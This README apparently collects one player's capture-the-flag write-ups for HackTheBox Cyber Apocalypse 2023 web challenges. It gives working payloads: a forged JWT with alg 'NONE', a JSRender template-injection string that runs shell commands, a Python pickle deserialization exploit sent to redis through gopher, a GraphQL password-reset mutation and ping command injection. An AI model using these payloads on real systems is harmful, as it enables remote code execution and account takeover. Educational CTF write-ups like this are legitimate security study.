# HTB-CA23
HackTheBox CyberApocalypse 2k23 writeups (Rowra)


## Web/Didactic Octo Paddle
* in `middleware/AdminMiddleware.js` you can notice the `else` clause in which `jwt.verify` func. call's 2nd parameter is `null`. This means there's not crypt involved. This obviously means very easily crafted JWTs
* the only `algorithm` matching this is `none`, however, the code's supposed to defend against that with an early return in the code
* with some trial & error I managed to bypass the mentioned early return by using the algorithm `NONE` _(capital)_. Meaning the actual working payload as follows _(parts are separated by a `.` dot)_:
1st part: `echo -n '{"typ":"JWT","alg":"NONE"}' | base64`
2nd part: the one you already have, just change `id` to `1` _(admin's id)_
3rd part: empty _(nothing following the `.`)_
* as the webapp's admin, still need to access `/flag.txt`. The code rendering `/admin` endpoint uses `JSRender NodeJS`. All that was left to do is to register a user with a username that's exploiting SSTI and then check `/admin` page for the flag. Working payload:
`{"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}","password":"fdg"}`

## Web/Trap Track
* you can read `admin:admin` admin creds from the source code
* you can follow the flow of the code but a check added on the admin page eventually lands at `worker/curltest.py`. It's quite obviously unsanitized, will run anything
* there's a python pickle deserialization which is a pretty bad practice and unsafe if we can control the input. It happens at multiple stages but I chose `application/cache.py`'s `get_job_queue` function as I deemed it pretty stable and easily reproduced at any time. This functions expects a `job_id` after which it'll read the job with that id from redis and unserialize it without any sanitization, again. The API endpoint belonging to this function call is `/api/tracks/<id>/status`
* `libcurl` can do `gopher` and redis may be controller through gopher calls.
* To put it all together and summarize:
1. generate payload:
```
import pickle 
import base64 
import os 
 
class RWR: 
    def __reduce__(self): 
        cmd = '''curl -XPOST http://127.0.0.1:1337/api/tracks/add -d "{\\"trapName\\": \\"`/readflag`\\", \\"trapURL\\": \\"http://1.2.3.4\\"}" -H "Co
ntent-Type: application/json" -H "Cookie: session=<admin cookie here>"''' 
        return os.system, (cmd, ) 
 
 
if __name__ == '__main__': 
    pickled = pickle.dumps(RWR()) 
    b64 = base64.b64encode(pickled).decode() 
    print(f'gopher://127.0.0.1:6379/_hset%20jobs%204444%20{b64}')
```
2. add the `gopher://` link received _(payload)_ on the admin page
3. detonate payload by `GET`ting `/api/tracks/4444/status`
4. go back to the admin site to collect the flag from the name of yet another added entry

## Web/Passman
* register a random user
* play around with the `graphql` queries and realise that `helpers/GraphqlHelper.js` line `#96` `UpdatePassword` does not check anything. A simple auth will do just fine and you can edit anyone's password
* craft a malicious `graphql query`:
{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"hahayouredone"}}
* login as admin

## Web/Gunhead
* the `/PING` command is pretty shady. Feels like it's passed straight through to shell
* `/ping 127.0.0.1; whoami` works just fine
* `/ping 127.0.0.1; ls /` shows the flag as `/flag.txt`
* `/ping 127.0.0.1; cat /flag.txt`

## Web/Trapped Source
* in the source code you can see the `js` included `/static/js/script.js`
* `script.js` has a function called `checkPin` which checks if entered ping is equal to `CONFIG.correctPin`
* just enter `CONFIG.correctPin` in the browser console and get the correct code `7298`

